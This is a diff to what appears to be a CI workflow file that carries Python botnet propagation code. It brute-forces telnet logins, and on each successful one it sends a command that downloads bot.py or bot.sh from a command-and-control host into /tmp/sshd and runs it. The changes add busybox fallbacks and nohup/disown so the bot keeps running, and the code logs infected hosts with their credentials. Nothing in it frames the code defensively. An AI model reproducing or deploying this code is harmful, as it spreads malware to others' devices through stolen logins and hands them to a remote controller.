@@ -80,11 +80,12 @@ jobs:
           ]
 
           DEPLOY = (
-              f"(wget -q http://{C2}:{PPORT}/bot.py -O /tmp/sshd && python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(curl -s http://{C2}:{PPORT}/bot.py -o /tmp/sshd && python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd && sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
-              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd && busybox sh /tmp/sshd {C2} {CPORT} enibot2024 &)"
+              # nohup + disown 防止shell断开时被杀
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; busybox nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &; busybox disown) || "
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.py -O /tmp/sshd; python3 /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(busybox wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; busybox sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(wget -q http://{C2}:{PPORT}/bot.sh -O /tmp/sshd; nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &) || "
+              f"(curl -s http://{C2}:{PPORT}/bot.sh -o /tmp/sshd; nohup sh /tmp/sshd {C2} {CPORT} enibot2024 &)"
           )
 
           infected = []
@@ -114,10 +115,12 @@ jobs:
                       fails = [b"incorrect", b"invalid", b"wrong", b"denied",
                                b"failed", b"bad", b"error", b"refused", b"disable"]
                       if any(h in resp_lower for h in hits) and not any(f in resp_lower for f in fails):
-                          s.send(b"sh\n"); time.sleep(0.4)
-                          try: s.recv(256)
+                          s.send(b"sh\n"); time.sleep(0.6)
+                          try: s.recv(512)
                           except: pass
-                          s.send(f"{DEPLOY}\n".encode()); time.sleep(0.5)
+                          s.send(f"{DEPLOY}\n".encode()); time.sleep(2.0)
+                          try: s.recv(512)
+                          except: pass
                           s.close()
                           with lock: infected.append(f"TELNET:{ip}:{port}:{user}:{pw}")
                           sys.stderr.write(f"INFECTED TELNET {ip}:{port} {user}:{pw}\n")
